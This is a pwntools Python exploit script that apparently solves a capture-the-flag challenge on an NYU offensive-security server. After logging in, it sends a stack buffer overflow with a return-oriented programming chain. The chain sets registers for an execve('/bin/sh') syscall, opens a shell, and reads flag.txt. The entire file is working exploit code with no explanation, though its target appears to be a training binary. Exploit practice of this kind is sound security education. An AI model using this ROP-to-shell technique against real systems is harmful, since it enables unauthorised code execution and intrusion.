#!/usr/bin/python
from pwn import *

p = remote("offsec-chalbroker.osiris.cyber.nyu.edu", 1342)

p.sendline("krm504")
p.recvuntil("shell")

syscall = p64(0x400625)
popRAX = p64(0x400646)
popRDI = p64(0x40062e)
popRSI = p64(0x400636)
popRDX = p64(0x40063e)

rdiVal = p64(0x400708) #/bin/sh
raxVal = p64(59)
rsiVal = p64(0)
rdxVal = p64(0)

overflow = 'A'*0x28 + popRDI + rdiVal + popRDX + rdxVal + popRSI + rsiVal + popRAX + raxVal + syscall

p.sendline(overflow)

pause(1)
p.sendline("cat flag.txt")
p.recvuntil('{')
flag = p.recvuntil('}')
print("flag{" + flag)
